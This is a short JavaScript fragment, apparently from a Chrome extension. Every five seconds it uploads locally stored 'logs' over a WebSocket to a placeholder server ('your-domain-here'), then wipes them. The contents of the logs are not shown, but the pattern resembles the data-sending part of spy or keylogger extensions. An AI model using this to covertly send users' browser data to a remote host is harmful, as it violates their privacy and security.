// Establishes WebSocket connection and flushes logs every 5 seconds
let socket = null;

function connectWS() {
  if (socket && socket.readyState === WebSocket.OPEN) return;

  // Replace with your domain
  socket = new WebSocket("wss://your-domain-here/submit");

  socket.onopen = () => {
    setInterval(() => {
      chrome.storage.local.get("d", (res) => {
        const logs = res.d || [];
        if (logs.length === 0) return;

        const payload = {
          ts: Date.now(),
          logs: logs
        };

        socket.send(JSON.stringify(payload));
        chrome.storage.local.set({ d: [] });
      });
    }, 5000);
  };

  socket.onerror = socket.onclose = () => {
    socket = null;
    setTimeout(connectWS, 10000);
  };
}
